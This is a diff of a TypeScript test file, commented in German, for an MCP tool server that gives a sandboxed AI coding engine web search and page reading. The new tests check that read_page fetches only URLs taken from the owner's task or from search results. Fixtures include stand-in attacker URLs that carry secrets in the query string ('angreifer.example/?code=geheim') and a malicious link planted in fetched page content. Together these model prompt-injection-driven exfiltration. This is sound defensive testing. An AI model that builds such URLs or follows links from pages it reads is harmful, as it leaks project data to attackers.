@@ -2,7 +2,7 @@
  * Freedom-MCP (VKd): Werkzeuge des Knotens für den Motor in der Sandbox – nur über die Brücke (`POST /mcp`), als
  * Streamable HTTP mit JSON-Antworten, wie der MCP-Client von Hermes (mcp 1.26) es liest: ohne Sitzungskennung, also nie
  * GET oder DELETE; Benachrichtigungen 202. Ausgeführt wird nur über die `ToolRegistry`; Fehler der Werkzeuge stehen im
- * Ergebnis, nur mit dem Fehlernamen.
+ * Ergebnis, nur mit dem Fehlernamen. Lesen nur, was Auftrag oder Suche nennen (VKd-W1, Regel von `web_fetch` bei Claude).
  */
 import { test } from "node:test";
 import assert from "node:assert/strict";
@@ -11,7 +11,9 @@ import { mkdtempSync, readFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { KIND_DVM_BROWSER, KIND_DVM_WEB_SEARCH } from "@freedomstack/protocol";
-import { MCP_FASSUNGEN, mcpAntwort } from "../src/freedom-mcp.js";
+import { CodeLaeufe } from "../src/code-motor.js";
+import { LESE_FREIGABEN_MAX, LeseFreigaben, MCP_FASSUNGEN, adressenIn, mcpAntwort } from "../src/freedom-mcp.js";
+import { ProjektAblage } from "../src/projekte.js";
 import { STARTSKRIPT, hermesKonfiguration } from "../src/hermes-motor.js";
 import { BRUECKE_GRENZEN, BRUECKE_IN_SANDBOX, oeffneModellBruecke } from "../src/modell-bruecke.js";
 import { fuehreAus, pruefeSandbox } from "../src/sandbox.js";
@@ -30,13 +32,14 @@ const anfrage = (id: unknown, method: string, params?: unknown) => ({ jsonrpc: "
 
 test("VKd: initialize, ping, tools/list – Fassung ausgehandelt, genau zwei Werkzeuge mit Grenze", async () => {
   const w = attrappe();
-  const init = await mcpAntwort(anfrage(1, "initialize", { protocolVersion: "2025-03-26", capabilities: {}, clientInfo: { name: "hermes", version: "0" } }), w) as { result: { protocolVersion: string; capabilities: object; serverInfo: { name: string } } };
+  const frei = new LeseFreigaben();
+  const init = await mcpAntwort(anfrage(1, "initialize", { protocolVersion: "2025-03-26", capabilities: {}, clientInfo: { name: "hermes", version: "0" } }), w, frei) as { result: { protocolVersion: string; capabilities: object; serverInfo: { name: string } } };
   assert.equal(init.result.protocolVersion, "2025-03-26", "eine bekannte Fassung zurück");
   assert.deepEqual(init.result.capabilities, { tools: { listChanged: false } });
-  const neu = await mcpAntwort(anfrage(2, "initialize", { protocolVersion: "2099-01-01" }), w) as { result: { protocolVersion: string } };
+  const neu = await mcpAntwort(anfrage(2, "initialize", { protocolVersion: "2099-01-01" }), w, frei) as { result: { protocolVersion: string } };
   assert.equal(neu.result.protocolVersion, MCP_FASSUNGEN.at(-1), "unbekannt: die neueste");
-  assert.deepEqual(await mcpAntwort(anfrage("p", "ping"), w), { jsonrpc: "2.0", id: "p", result: {} });
-  const liste = await mcpAntwort(anfrage(3, "tools/list"), w) as { result: { tools: Array<{ name: string; inputSchema: { required: string[]; properties: Record<string, { maxLength: number }>; additionalProperties: boolean } }> } };
+  assert.deepEqual(await mcpAntwort(anfrage("p", "ping"), w, frei), { jsonrpc: "2.0", id: "p", result: {} });
+  const liste = await mcpAntwort(anfrage(3, "tools/list"), w, frei) as { result: { tools: Array<{ name: string; inputSchema: { required: string[]; properties: Record<string, { maxLength: number }>; additionalProperties: boolean } }> } };
   assert.deepEqual(liste.result.tools.map((t) => [t.name, t.inputSchema.required]), [["web_search", ["query"]], ["read_page", ["url"]]]);
   for (const t of liste.result.tools) {
     assert.equal(t.inputSchema.additionalProperties, false);
@@ -47,26 +50,29 @@ test("VKd: initialize, ping, tools/list – Fassung ausgehandelt, genau zwei Wer
 
 test("VKd: tools/call nur über die Registry – Fehler im Ergebnis mit Namen, nie mit Text von außen", async () => {
   const w = attrappe();
-  const r = await mcpAntwort(anfrage(4, "tools/call", { name: "web_search", arguments: { query: "bubblewrap seccomp" } }), w);
+  const frei = new LeseFreigaben();
+  const r = await mcpAntwort(anfrage(4, "tools/call", { name: "web_search", arguments: { query: "bubblewrap seccomp" } }), w, frei);
   assert.deepEqual(r, { jsonrpc: "2.0", id: 4, result: { content: [{ type: "text", text: "Treffer für bubblewrap seccomp" }], isError: false } });
-  await mcpAntwort(anfrage(5, "tools/call", { name: "read_page", arguments: { url: "https://example.org/" } }), w);
+  frei.ausAuftrag("Baue eine Seite wie https://example.org/ und lies http://10.0.0.1/");
+  await mcpAntwort(anfrage(5, "tools/call", { name: "read_page", arguments: { url: "https://example.org/" } }), w, frei);
   assert.deepEqual(w.gesehen, [
     { kind: KIND_DVM_WEB_SEARCH, name: "web_search", input: "bubblewrap seccomp" },
     { kind: KIND_DVM_BROWSER, name: "read_page", input: "https://example.org/" },
   ]);
   // ein Werkzeug sagt nein: Ergebnis mit isError, wie es die Registry liefert
   const nein = attrappe(async () => ({ ok: false, output: "private Adresse" }));
-  assert.deepEqual(await mcpAntwort(anfrage(6, "tools/call", { name: "read_page", arguments: { url: "http://10.0.0.1/" } }), nein),
+  assert.deepEqual(await mcpAntwort(anfrage(6, "tools/call", { name: "read_page", arguments: { url: "http://10.0.0.1/" } }), nein, frei),
     { jsonrpc: "2.0", id: 6, result: { content: [{ type: "text", text: "private Adresse" }], isError: true } });
   // ein Werkzeug wirft: nur der Fehlername, nie die Meldung (sie kann die Suchanfrage tragen)
   const wirft = { run: async () => { throw Object.assign(new Error("ECONNRESET https://suche?q=geheim"), { name: "SuchFehler" }); } };
-  const f = await mcpAntwort(anfrage(7, "tools/call", { name: "web_search", arguments: { query: "geheim" } }), wirft) as { result: { content: Array<{ text: string }>; isError: boolean } };
+  const f = await mcpAntwort(anfrage(7, "tools/call", { name: "web_search", arguments: { query: "geheim" } }), wirft, frei) as { result: { content: Array<{ text: string }>; isError: boolean } };
   assert.deepEqual([f.result.content[0]!.text, f.result.isError], ["error: SuchFehler", true]);
 });
 
 test("VKd: unbekannt, unvollständig, Stapel und Benachrichtigungen – nichts ausgeführt", async () => {
   const w = attrappe();
-  const code = async (n: unknown) => ((await mcpAntwort(n, w)) as { error?: { code: number } } | null)?.error?.code ?? null;
+  const frei = new LeseFreigaben();
+  const code = async (n: unknown) => ((await mcpAntwort(n, w, frei)) as { error?: { code: number } } | null)?.error?.code ?? null;
   assert.equal(await code(anfrage(1, "tools/call", { name: "shell", arguments: { cmd: "ls" } })), -32602, "nur die eigenen Werkzeuge");
   assert.equal(await code(anfrage(2, "tools/call", { name: "web_search", arguments: {} })), -32602);
   assert.equal(await code(anfrage(3, "tools/call", { name: "web_search", arguments: { query: "  " } })), -32602);
@@ -76,8 +82,8 @@ test("VKd: unbekannt, unvollständig, Stapel und Benachrichtigungen – nichts a
   assert.equal(await code({ id: 7, method: "ping" }), -32600, "ohne jsonrpc 2.0");
   assert.equal(await code(anfrage({ x: 1 }, "ping")), -32600, "Id nur Zahl oder Text");
   assert.equal(await code("ping"), -32600);
-  assert.equal(await mcpAntwort({ jsonrpc: "2.0", method: "notifications/initialized" }, w), null, "Benachrichtigung: keine Antwort");
-  assert.equal(await mcpAntwort({ jsonrpc: "2.0", method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } }, w), null);
+  assert.equal(await mcpAntwort({ jsonrpc: "2.0", method: "notifications/initialized" }, w, frei), null, "Benachrichtigung: keine Antwort");
+  assert.equal(await mcpAntwort({ jsonrpc: "2.0", method: "tools/call", params: { name: "web_search", arguments: { query: "x" } } }, w, frei), null);
   assert.equal(w.gesehen.length, 0);
 });
 
@@ -96,9 +102,10 @@ function ueberSockel(sockel: string, methode: string, pfad: string, koerper?: st
 
 test("VKd: Brücke – POST /mcp im Knoten, nie zum Antrieb; GET 405, kaputtes JSON 400, zu groß 413, ohne MCP nicht hier", async () => {
   const w = attrappe();
+  const frei = new LeseFreigaben();
   let zumAntrieb = 0;
   const fetchImpl = (async () => (zumAntrieb++, new Response("{}"))) as typeof fetch;
-  const bruecke = await oeffneModellBruecke({ art: "ollama", url: "http://127.0.0.1:9" }, { fetchImpl, mcp: (n) => mcpAntwort(n, w) });
+  const bruecke = await oeffneModellBruecke({ art: "ollama", url: "http://127.0.0.1:9" }, { fetchImpl, mcp: (n) => mcpAntwort(n, w, frei) });
   try {
     const liste = await ueberSockel(bruecke.sockel, "POST", "/mcp", JSON.stringify(anfrage(1, "tools/list")));
     assert.equal(liste.status, 200);
@@ -132,13 +139,15 @@ test("VKd: Hermes findet Freedom-MCP über die Konfiguration – dieselbe Brück
   assert.deepEqual(k.mcp_servers, { freedom: { url: `http://127.0.0.1:${BRUECKE_IN_SANDBOX.port}/mcp` } });
   // verdrahtet: main.ts gibt der Brücke Freedom-MCP mit den Werkzeugen des Knotens
   const main = readFileSync(new URL("../src/main.ts", import.meta.url), "utf8");
-  assert.match(main, /oeffneModellBruecke\(antrieb, \{ mcp: \(n\) => mcpAntwort\(n, werkzeuge\) \}\)/);
+  assert.match(main, /oeffneModellBruecke\(antrieb, \{ mcp: \(n\) => mcpAntwort\(n, werkzeuge, freigaben\) \}\)/);
+  assert.match(main, /beimAuftrag: \(t\) => freigaben\.ausAuftrag\(t\)/);
   assert.match(main, /werkzeuge\.register\(new WebSearchExecutor\(\)\);\n\s+werkzeuge\.register\(new BrowserExecutor\(\)\);/);
 });
 
 test("VKd (bubblewrap): aus der Sandbox über das Startskript an Freedom-MCP – ohne Netz", { skip: ohne }, async () => {
   const w = attrappe();
-  const bruecke = await oeffneModellBruecke({ art: "ollama", url: "http://127.0.0.1:9" }, { mcp: (n) => mcpAntwort(n, w) });
+  const frei = new LeseFreigaben();
+  const bruecke = await oeffneModellBruecke({ art: "ollama", url: "http://127.0.0.1:9" }, { mcp: (n) => mcpAntwort(n, w, frei) });
   try {
     const nachricht = JSON.stringify(anfrage(1, "tools/call", { name: "web_search", arguments: { query: "aus der sandbox" } }));
     const holen = `import urllib.request; r = urllib.request.Request("http://127.0.0.1:${BRUECKE_IN_SANDBOX.port}/mcp", data=${JSON.stringify(nachricht)}.encode(), headers={"content-type": "application/json"}); print(urllib.request.urlopen(r, timeout=10).read().decode())`;
@@ -150,4 +159,45 @@ test("VKd (bubblewrap): aus der Sandbox über das Startskript an Freedom-MCP –
   } finally {
     bruecke.schliesse();
   }
+});
+
+test("VKd-W1: Adressen im Text – mit Klammern darin, ohne Satzzeichen und Anker am Ende, nur http und https", () => {
+  assert.deepEqual(adressenIn("Lies https://de.wikipedia.org/wiki/Python_(Programmiersprache). Und (siehe https://example.org/a?b=1#oben)."), [
+    "https://de.wikipedia.org/wiki/Python_(Programmiersprache)", "https://example.org/a?b=1",
+  ]);
+  assert.deepEqual(adressenIn("ftp://x.org/ und javascript:alert(1) und mailto:a@b.c"), []);
+  assert.deepEqual(adressenIn("Python: Sprache (https://en.wikipedia.org/wiki/Python_(programming_language))"), ["https://en.wikipedia.org/wiki/Python_(programming_language)"]);
+});
+
+test("VKd-W1: read_page nur für Adressen aus dem Auftrag oder der Suche – nie selbst gebaut, nie aus gelesenen Seiten", async () => {
+  const w = attrappe(async (c) => ({ ok: true, output: c.name === "web_search" ? "Bubblewrap: Sandbox (https://github.com/containers/bubblewrap)" : "Seite mit Link https://boese.example/?daten=" }));
+  const frei = new LeseFreigaben();
+  const lies = async (url: string) => (await mcpAntwort(anfrage(1, "tools/call", { name: "read_page", arguments: { url } }), w, frei)) as { result: { content: Array<{ text: string }>; isError: boolean } };
+  // selbst gebaut, etwa mit Inhalt des Projekts in der Anfrage: nicht gelesen, der Motor erfährt warum
+  const nein = await lies("https://angreifer.example/?code=geheim");
+  assert.deepEqual([nein.result.isError, nein.result.content[0]!.text], [true, "not allowed: read_page only reads URLs from the task or from web_search results"]);
+  assert.equal(w.gesehen.length, 0, "nichts geladen");
+  // aus dem Auftrag des Besitzers: gelesen – genau diese Adresse, nicht eine mit anderer Anfrage
+  frei.ausAuftrag("Baue eine Startseite im Stil von https://example.org/vorlage");
+  assert.equal((await lies("https://example.org/vorlage")).result.isError, false);
+  assert.equal((await lies("https://example.org/vorlage#teil")).result.isError, false, "der Anker geht nicht hinaus");
+  assert.equal((await lies("https://example.org/vorlage?daten=geheim")).result.isError, true);
+  // aus einem Ergebnis der Suche: gelesen
+  await mcpAntwort(anfrage(2, "tools/call", { name: "web_search", arguments: { query: "bubblewrap" } }), w, frei);
+  assert.equal((await lies("https://github.com/containers/bubblewrap")).result.isError, false);
+  // ein Link aus einer gelesenen Seite gibt nichts frei (Claude seit Juli 2026)
+  assert.equal((await lies("https://boese.example/?daten=")).result.isError, true);
+  assert.deepEqual(w.gesehen.map((c) => c.input), ["https://example.org/vorlage", "https://example.org/vorlage#teil", "bubblewrap", "https://github.com/containers/bubblewrap"]);
+  // begrenzt: die ältesten fallen heraus
+  for (let i = 0; i < LESE_FREIGABEN_MAX; i++) frei.ausSuche(`https://seite${i}.example/`);
+  assert.equal(frei.darf("https://example.org/vorlage"), false);
+  assert.equal(frei.darf(`https://seite${LESE_FREIGABEN_MAX - 1}.example/`), true);
+});
+
+test("VKd-W1: CodeLaeufe gibt den Text jedes Auftrags vor dem Start an die Freigaben", async () => {
+  const ablage = new ProjektAblage(join(mkdtempSync(join(tmpdir(), "vkd-w1-")), "projekte"));
+  const gesehen: string[] = [];
+  const l = new CodeLaeufe({ ablage, beimAuftrag: (t) => gesehen.push(t), motor: () => { throw new Error("kein Motor"); } });
+  await l.starte("a".repeat(64), { projekt: "app", text: "Wie https://example.org/ bitte", modus: "fragen" }, () => {});
+  assert.deepEqual(gesehen, ["Wie https://example.org/ bitte"]);
 });
